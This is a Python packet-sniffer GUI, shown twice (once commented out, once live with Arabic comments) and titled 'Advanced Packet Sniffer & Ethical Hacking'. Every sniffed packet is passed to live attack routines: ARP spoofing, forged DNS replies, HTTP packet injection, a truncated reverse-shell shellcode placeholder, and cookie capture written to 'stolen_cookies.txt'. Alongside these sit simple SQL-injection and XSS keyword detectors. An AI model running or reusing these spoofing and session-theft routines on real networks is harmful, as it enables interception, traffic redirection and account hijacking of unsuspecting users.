# import scapy.all as scapy
# import psutil
# from prettytable import PrettyTable
# import re
# import time
# import threading
# from colorama import Fore, Style
# from scapy.layers.inet import IP, TCP, UDP, ICMP
# from scapy.layers.http import HTTPRequest
# from scapy.layers.dns import DNS, DNSRR
# from scapy.layers.l2 import ARP
# from scapy.all import Raw
# import json
# import sqlite3
# import tkinter as tk
# from tkinter import ttk, messagebox, filedialog
# from datetime import datetime
# import pyshark
# # Add this at the beginning of the script to enforce UTF-8 encoding
# import sys
# sys.stdout.reconfigure(encoding='utf-8')
# sys.stdin.reconfigure(encoding='utf-8')

# # Database setup for storing packets
# def setup_database():
#     conn = sqlite3.connect("packets.db", check_same_thread=False)
#     cursor = conn.cursor()
#     cursor.execute("""
#         CREATE TABLE IF NOT EXISTS packets (
#             id INTEGER PRIMARY KEY AUTOINCREMENT,
#             timestamp TEXT,
#             source_ip TEXT,
#             destination_ip TEXT,
#             protocol TEXT,
#             summary TEXT
#         )
#     """)
#     conn.commit()
#     return conn

# # Function to get the current MAC address of the system.
# def get_current_mac(interface):
#     try:
#         addrs = psutil.net_if_addrs()
#         mac = addrs[interface][0].address if interface in addrs else None
#         return mac if mac and re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", mac) else "No MAC assigned"
#     except Exception as e:
#         print(f"{Fore.RED}[!] Error getting MAC address: {e}{Style.RESET_ALL}")
#         return "No MAC assigned"

# # Function to get the current IP address of the system.
# def get_current_ip(interface):
#     try:
#         addrs = psutil.net_if_addrs()
#         for addr in addrs.get(interface, []):
#             if addr.family.name == 'AF_INET':
#                 return addr.address
#         return "No IP assigned"
#     except Exception as e:
#         print(f"{Fore.RED}[!] Error getting IP address: {e}{Style.RESET_ALL}")
#         return "No IP assigned"

# # Function to display the IP and MAC table.
# def ip_table():
#     addrs = psutil.net_if_addrs()
#     t = PrettyTable([f"{Fore.GREEN}Interface", "MAC Address", f"IP Address{Style.RESET_ALL}"])
#     for interface, details in addrs.items():
#         mac = get_current_mac(interface)
#         ip = get_current_ip(interface)
#         t.add_row([interface, mac, ip])
#     print(t)

# # Sniffing and Attack functions
# def arp_spoofing(pk):
#     if pk.haslayer(ARP) and pk[ARP].op == 1:
#         spoofed_arp = ARP(op=2, hwsrc="11:22:33:44:55:66", psrc=pk[ARP].pdst, hwdst=pk[ARP].hwsrc, pdst=pk[ARP].psrc)
#         scapy.send(spoofed_arp, verbose=0)
#         print(f"ARP Spoofing: Spoofed {pk[ARP].psrc}")

# def dns_spoofing(pk):
#     if pk.haslayer(DNS) and pk[DNS].qr == 0:
#         victim_ip = pk[IP].src
#         fake_dns_response = IP(dst=victim_ip, src=pk[IP].dst) / \
#                             UDP(dport=pk[UDP].sport, sport=pk[UDP].dport) / \
#                             DNS(id=pk[DNS].id, qr=1, aa=1, qd=pk[DNS].qd, an=DNSRR(rrname=pk[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))
#         scapy.send(fake_dns_response, verbose=0)
#         print(f"DNS Spoofing: Redirected {pk[DNS].qd.qname} to 1.2.3.4")

# def mitm_attack(pk):
#     try:
#         if pk.haslayer(TCP) and pk.haslayer(Raw):
#             raw_data = pk[Raw].load.decode(errors='ignore')
#             if "HTTP" in raw_data:
#                 print("MITM Attack: Intercepted HTTP data.")
#                 modified_data = raw_data.replace("OriginalContent", "ModifiedContent")
#                 new_pkt = IP(src=pk[IP].dst, dst=pk[IP].src) / TCP(sport=pk[TCP].dport, dport=pk[TCP].sport) / Raw(load=modified_data)
#                 scapy.send(new_pkt, verbose=0)
#     except Exception as e:
#         print(f"Error in MITM attack: {e}")

# def inject_reverse_shell(pk):
#     if pk.haslayer(TCP) and pk.haslayer(Raw):
#         raw_data = pk[Raw].load
#         if "HTTP" in raw_data.decode(errors='ignore'):
#             reverse_shell_payload = b"\x31\xdb\xbb\x0b\xba\x01\x89\xe1..."
#             new_pkt = IP(src=pk[IP].dst, dst=pk[IP].src) / TCP(sport=pk[TCP].dport, dport=pk[TCP].sport, flags="A") / Raw(load=reverse_shell_payload)
#             scapy.send(new_pkt, verbose=0)

# def steal_cookies_and_sessions(pk):
#     if pk.haslayer(HTTPRequest) and pk.haslayer(Raw):
#         raw_data = pk[Raw].load.decode(errors='ignore')
#         if "Cookie:" in raw_data:
#             cookies = [line for line in raw_data.split("\r\n") if "Cookie:" in line]
#             if cookies:
#                 print(f"Cookies Captured: {cookies}")
#                 with open("stolen_cookies.txt", "a") as f:
#                     f.write(f"Captured at {datetime.now()} - {cookies}\n")

# # Using pyshark to analyze TLS/SSL (don't need the old function, keep the pyshark version)
# def capture_tls_traffic(interface):
#     try:
#         capture = pyshark.LiveCapture(interface=interface, display_filter='tls')
#         print(f"Starting TLS capture on interface {interface}...")
#         for packet in capture.sniff_continuously(packet_count=10):
#             if 'TLS' in packet:
#                 print(f"Captured TLS packet from {packet.ip.src} to {packet.ip.dst}")
#                 print(packet.tls)
#     except Exception as e:
#         print(f"Error capturing TLS traffic: {e}")

# def port_scanning(pk):
#     if pk.haslayer(TCP):
#         if pk[TCP].flags == "S":
#             print(f"Port Scanning Detected: {pk[IP].src} is scanning port {pk[TCP].dport}")

# def detect_sql_injection(pk):
#     if pk.haslayer(Raw):
#         raw_data = pk[Raw].load.decode(errors='ignore').lower()
#         sql_keywords = ['select', 'union', 'insert', 'drop', '--', ';--', 'or', 'and', '1=1']
#         if any(keyword in raw_data for keyword in sql_keywords):
#             print(f"Potential SQL Injection Attempt Detected: {raw_data}")
#             with open("sql_injection_log.txt", "a") as f:
#                 f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# def detect_xss(pk):
#     if pk.haslayer(Raw):
#         raw_data = pk[Raw].load.decode(errors='ignore').lower()
#         xss_patterns = ['<script>', 'onerror', 'alert(']
#         if any(pattern in raw_data for pattern in xss_patterns):
#             print(f"Potential XSS Attempt Detected: {raw_data}")
#             with open("xss_log.txt", "a") as f:
#                 f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# def packet_callback(packet, filter_type=None, conn=None):
#     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

#     if packet.haslayer(IP):
#         ip_layer = packet[IP]
#         try:
#             summary = packet.summary().encode('utf-8', errors='replace').decode('utf-8')
#         except UnicodeEncodeError:
#             summary = "Error encoding packet summary."
        
#         if conn:
#             cursor = conn.cursor()
#             cursor.execute("""
#                 INSERT INTO packets (timestamp, source_ip, destination_ip, protocol, summary)
#                 VALUES (?, ?, ?, ?, ?)
#             """, (timestamp, ip_layer.src, ip_layer.dst, "IP", summary))
#             conn.commit()

#         arp_spoofing(packet)
#         dns_spoofing(packet)
#         mitm_attack(packet)
#         inject_reverse_shell(packet)
#         steal_cookies_and_sessions(packet)
#         port_scanning(packet)
#         detect_sql_injection(packet)
#         detect_xss(packet)
#     else:
#         print(f"[!] Packet without IP layer captured: {repr(packet)}")

# # GUI for the sniffer
# class SnifferApp:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("Advanced Packet Sniffer & Ethical Hacking")
#         self.conn = setup_database()

#         self.interface_label = ttk.Label(root, text="Select Interface:")
#         self.interface_label.grid(row=0, column=0, padx=10, pady=10)
#         self.interface_var = tk.StringVar()
#         self.interface_dropdown = ttk.Combobox(root, textvariable=self.interface_var)
#         self.interface_dropdown.grid(row=0, column=1, padx=10, pady=10)
#         self.refresh_interfaces()

#         self.filter_label = ttk.Label(root, text="Filter Type:")
#         self.filter_label.grid(row=1, column=0, padx=10, pady=10)
#         self.filter_var = tk.StringVar()
#         self.filter_dropdown = ttk.Combobox(root, textvariable=self.filter_var, values=["All", "TCP", "UDP", "ICMP", "HTTP", "DNS", "ARP"])
#         self.filter_dropdown.grid(row=1, column=1, padx=10, pady=10)
#         self.filter_dropdown.set("All")

#         self.start_button = ttk.Button(root, text="Start Sniffing", command=self.start_sniffing)
#         self.start_button.grid(row=2, column=0, padx=10, pady=10)
#         self.stop_button = ttk.Button(root, text="Stop Sniffing", command=self.stop_sniffing, state=tk.DISABLED)
#         self.stop_button.grid(row=2, column=1, padx=10, pady=10)

#         self.export_button = ttk.Button(root, text="Export Packets", command=self.export_packets)
#         self.export_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

#         self.status_label = ttk.Label(root, text="Status: Idle")
#         self.status_label.grid(row=4, column=0, columnspan=2, padx=10, pady=10)

#         self.sniff_thread = None
#         self.running = False

#     def refresh_interfaces(self):
#         interfaces = list(psutil.net_if_addrs().keys())
#         self.interface_dropdown['values'] = interfaces
#         if interfaces:
#             self.interface_var.set(interfaces[0])

#     def start_sniffing(self):
#         if not self.running:
#             self.running = True
#             self.status_label.config(text="Status: Sniffing...")
#             self.start_button.config(state=tk.DISABLED)
#             self.stop_button.config(state=tk.NORMAL)

#             interface = self.interface_var.get()
#             filter_type = self.filter_var.get()
#             self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(interface, filter_type))
#             self.sniff_thread.start()

#     def stop_sniffing(self):
#         if self.running:
#             self.running = False
#             self.status_label.config(text="Status: Stopped")
#             self.start_button.config(state=tk.NORMAL)
#             self.stop_button.config(state=tk.DISABLED)

#     def sniff_packets(self, interface, filter_type):
#         try:
#             scapy.sniff(iface=interface, filter="ip", prn=lambda packet: packet_callback(packet, filter_type, self.conn), store=False)
#         except Exception as e:
#             messagebox.showerror("Error", f"An error occurred: {e}")

#     def export_packets(self):
#         file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON Files", "*.json"), ("CSV Files", "*.csv")])
#         if file_path:
#             if file_path.endswith(".json"):
#                 with open(file_path, "w") as f:
#                     cursor = self.conn.cursor()
#                     cursor.execute("SELECT * FROM packets")
#                     rows = cursor.fetchall()
#                     json.dump([dict(zip([key[0] for key in cursor.description], row)) for row in rows], f, indent=4)
#                 messagebox.showinfo("Success", "Packets exported to JSON successfully!")
#             elif file_path.endswith(".csv"):
#                 with open(file_path, "w") as f:
#                     cursor = self.conn.cursor()
#                     cursor.execute("SELECT * FROM packets")
#                     rows = cursor.fetchall()
#                     f.write(",".join([key[0] for key in cursor.description]) + "\n")
#                     for row in rows:
#                         f.write(",".join(map(str, row)) + "\n")
#                 messagebox.showinfo("Success", "Packets exported to CSV successfully!")

# if __name__ == "__main__":
#     root = tk.Tk()
#     app = SnifferApp(root)
#     root.mainloop()


























#New Dragon

import scapy.all as scapy
import psutil
from prettytable import PrettyTable
import re
import time
import threading
from colorama import Fore, Style
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.l2 import ARP
from scapy.all import Raw
import json
import sqlite3
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from datetime import datetime
import pyshark
import logging
import sys

# إعدادات الترميز
sys.stdout.reconfigure(encoding='utf-8')
sys.stdin.reconfigure(encoding='utf-8')

# إعدادات التسجيل (Logging)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("sniffer.log"),
        logging.StreamHandler()
    ]
)

# إعداد قاعدة البيانات
def setup_database():
    """إعداد قاعدة البيانات لتخزين الحزم."""
    conn = sqlite3.connect("packets.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS packets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            source_ip TEXT,
            destination_ip TEXT,
            protocol TEXT,
            summary TEXT
        )
    """)
    conn.commit()
    return conn

# الحصول على عنوان MAC الحالي
def get_current_mac(interface):
    """الحصول على عنوان MAC لواجهة معينة."""
    try:
        addrs = psutil.net_if_addrs()
        mac = addrs[interface][0].address if interface in addrs else None
        return mac if mac and re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", mac) else "No MAC assigned"
    except Exception as e:
        logging.error(f"Error getting MAC address: {e}")
        return "No MAC assigned"

# الحصول على عنوان IP الحالي
def get_current_ip(interface):
    """الحصول على عنوان IP لواجهة معينة."""
    try:
        addrs = psutil.net_if_addrs()
        for addr in addrs.get(interface, []):
            if addr.family.name == 'AF_INET':
                return addr.address
        return "No IP assigned"
    except Exception as e:
        logging.error(f"Error getting IP address: {e}")
        return "No IP assigned"

# عرض جدول IP وMAC
def ip_table():
    """عرض جدول يوضح واجهات الشبكة وعناوين IP وMAC."""
    addrs = psutil.net_if_addrs()
    table = PrettyTable([f"{Fore.GREEN}Interface", "MAC Address", f"IP Address{Style.RESET_ALL}"])
    for interface, details in addrs.items():
        mac = get_current_mac(interface)
        ip = get_current_ip(interface)
        table.add_row([interface, mac, ip])
    print(table)

# هجوم ARP Spoofing
def arp_spoofing(packet):
    """تنفيذ هجوم ARP Spoofing."""
    if packet.haslayer(ARP) and packet[ARP].op == 1:
        spoofed_arp = ARP(op=2, hwsrc="11:22:33:44:55:66", psrc=packet[ARP].pdst, hwdst=packet[ARP].hwsrc, pdst=packet[ARP].psrc)
        scapy.send(spoofed_arp, verbose=0)
        logging.info(f"ARP Spoofing: Spoofed {packet[ARP].psrc}")

# هجوم DNS Spoofing
def dns_spoofing(packet):
    """تنفيذ هجوم DNS Spoofing."""
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        victim_ip = packet[IP].src
        fake_dns_response = IP(dst=victim_ip, src=packet[IP].dst) / \
                            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                            DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))
        scapy.send(fake_dns_response, verbose=0)
        logging.info(f"DNS Spoofing: Redirected {packet[DNS].qd.qname} to 1.2.3.4")

# هجوم Man-in-the-Middle (MITM)
def mitm_attack(packet):
    """تنفيذ هجوم MITM."""
    try:
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            raw_data = packet[Raw].load.decode(errors='ignore')
            if "HTTP" in raw_data:
                logging.info("MITM Attack: Intercepted HTTP data.")
                modified_data = raw_data.replace("OriginalContent", "ModifiedContent")
                new_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport) / Raw(load=modified_data)
                scapy.send(new_pkt, verbose=0)
    except Exception as e:
        logging.error(f"Error in MITM attack: {e}")

# حقن شل عكسي
def inject_reverse_shell(packet):
    """حقن شل عكسي."""
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        raw_data = packet[Raw].load
        if "HTTP" in raw_data.decode(errors='ignore'):
            reverse_shell_payload = b"\x31\xdb\xbb\x0b\xba\x01\x89\xe1..."
            new_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="A") / Raw(load=reverse_shell_payload)
            scapy.send(new_pkt, verbose=0)

# سرقة ملفات تعريف الارتباط
def steal_cookies_and_sessions(packet):
    """سرقة ملفات تعريف الارتباط والجلسات."""
    if packet.haslayer(HTTPRequest) and packet.haslayer(Raw):
        raw_data = packet[Raw].load.decode(errors='ignore')
        if "Cookie:" in raw_data:
            cookies = [line for line in raw_data.split("\r\n") if "Cookie:" in line]
            if cookies:
                logging.info(f"Cookies Captured: {cookies}")
                with open("stolen_cookies.txt", "a") as f:
                    f.write(f"Captured at {datetime.now()} - {cookies}\n")

# تحليل حركة TLS/SSL باستخدام pyshark
def capture_tls_traffic(interface):
    """تحليل حركة TLS/SSL."""
    try:
        capture = pyshark.LiveCapture(interface=interface, display_filter='tls')
        logging.info(f"Starting TLS capture on interface {interface}...")
        for packet in capture.sniff_continuously(packet_count=10):
            if 'TLS' in packet:
                logging.info(f"Captured TLS packet from {packet.ip.src} to {packet.ip.dst}")
                print(packet.tls)
    except Exception as e:
        logging.error(f"Error capturing TLS traffic: {e}")

# اكتشاف فحص المنافذ
def port_scanning(packet):
    """اكتشاف فحص المنافذ."""
    if packet.haslayer(TCP):
        if packet[TCP].flags == "S":
            logging.info(f"Port Scanning Detected: {packet[IP].src} is scanning port {packet[TCP].dport}")

# اكتشاف حقن SQL
def detect_sql_injection(packet):
    """اكتشاف محاولات حقن SQL."""
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load.decode(errors='ignore').lower()
        sql_keywords = ['select', 'union', 'insert', 'drop', '--', ';--', 'or', 'and', '1=1']
        if any(keyword in raw_data for keyword in sql_keywords):
            logging.info(f"Potential SQL Injection Attempt Detected: {raw_data}")
            with open("sql_injection_log.txt", "a") as f:
                f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# اكتشاف هجمات XSS
def detect_xss(packet):
    """اكتشاف محاولات XSS."""
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load.decode(errors='ignore').lower()
        xss_patterns = ['<script>', 'onerror', 'alert(']
        if any(pattern in raw_data for pattern in xss_patterns):
            logging.info(f"Potential XSS Attempt Detected: {raw_data}")
            with open("xss_log.txt", "a") as f:
                f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# معالجة الحزم
def packet_callback(packet, filter_type=None, conn=None):
    """معالجة الحزم الملتقطة."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    if packet.haslayer(IP):
        ip_layer = packet[IP]
        try:
            summary = packet.summary().encode('utf-8', errors='replace').decode('utf-8')
        except UnicodeEncodeError:
            summary = "Error encoding packet summary."
        
        if conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO packets (timestamp, source_ip, destination_ip, protocol, summary)
                VALUES (?, ?, ?, ?, ?)
            """, (timestamp, ip_layer.src, ip_layer.dst, "IP", summary))
            conn.commit()

        arp_spoofing(packet)
        dns_spoofing(packet)
        mitm_attack(packet)
        inject_reverse_shell(packet)
        steal_cookies_and_sessions(packet)
        port_scanning(packet)
        detect_sql_injection(packet)
        detect_xss(packet)
    else:
        logging.warning(f"Packet without IP layer captured: {repr(packet)}")

# واجهة المستخدم الرسومية
class SnifferApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Packet Sniffer & Ethical Hacking")
        self.conn = setup_database()

        self.interface_label = ttk.Label(root, text="Select Interface:")
        self.interface_label.grid(row=0, column=0, padx=10, pady=10)
        self.interface_var = tk.StringVar()
        self.interface_dropdown = ttk.Combobox(root, textvariable=self.interface_var)
        self.interface_dropdown.grid(row=0, column=1, padx=10, pady=10)
        self.refresh_interfaces()

        self.filter_label = ttk.Label(root, text="Filter Type:")
        self.filter_label.grid(row=1, column=0, padx=10, pady=10)
        self.filter_var = tk.StringVar()
        self.filter_dropdown = ttk.Combobox(root, textvariable=self.filter_var, values=["All", "TCP", "UDP", "ICMP", "HTTP", "DNS", "ARP"])
        self.filter_dropdown.grid(row=1, column=1, padx=10, pady=10)
        self.filter_dropdown.set("All")

        self.start_button = ttk.Button(root, text="Start Sniffing", command=self.start_sniffing)
        self.start_button.grid(row=2, column=0, padx=10, pady=10)
        self.stop_button = ttk.Button(root, text="Stop Sniffing", command=self.stop_sniffing, state=tk.DISABLED)
        self.stop_button.grid(row=2, column=1, padx=10, pady=10)

        self.export_button = ttk.Button(root, text="Export Packets", command=self.export_packets)
        self.export_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

        self.status_label = ttk.Label(root, text="Status: Idle")
        self.status_label.grid(row=4, column=0, columnspan=2, padx=10, pady=10)

        self.sniff_thread = None
        self.running = False

    def refresh_interfaces(self):
        """تحديث قائمة واجهات الشبكة."""
        interfaces = list(psutil.net_if_addrs().keys())
        self.interface_dropdown['values'] = interfaces
        if interfaces:
            self.interface_var.set(interfaces[0])

    def start_sniffing(self):
        """بدء التقاط الحزم."""
        if not self.running:
            self.running = True
            self.status_label.config(text="Status: Sniffing...")
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)

            interface = self.interface_var.get()
            filter_type = self.filter_var.get()
            self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(interface, filter_type))
            self.sniff_thread.start()

    def stop_sniffing(self):
        """إيقاف التقاط الحزم."""
        if self.running:
            self.running = False
            self.status_label.config(text="Status: Stopped")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def sniff_packets(self, interface, filter_type):
        """التقاط الحزم."""
        try:
            scapy.sniff(iface=interface, filter="ip", prn=lambda packet: packet_callback(packet, filter_type, self.conn), store=False)
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

    def export_packets(self):
        """تصدير الحزم إلى ملف."""
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON Files", "*.json"), ("CSV Files", "*.csv")])
        if file_path:
            if file_path.endswith(".json"):
                with open(file_path, "w") as f:
                    cursor = self.conn.cursor()
                    cursor.execute("SELECT * FROM packets")
                    rows = cursor.fetchall()
                    json.dump([dict(zip([key[0] for key in cursor.description], row)) for row in rows], f, indent=4)
                messagebox.showinfo("Success", "Packets exported to JSON successfully!")
            elif file_path.endswith(".csv"):
                with open(file_path, "w") as f:
                    cursor = self.conn.cursor()
                    cursor.execute("SELECT * FROM packets")
                    rows = cursor.fetchall()
                    f.write(",".join([key[0] for key in cursor.description]) + "\n")
                    for row in rows:
                        f.write(",".join(map(str, row)) + "\n")
                messagebox.showinfo("Success", "Packets exported to CSV successfully!")

if __name__ == "__main__":
    root = tk.Tk()
    app = SnifferApp(root)
    root.mainloop()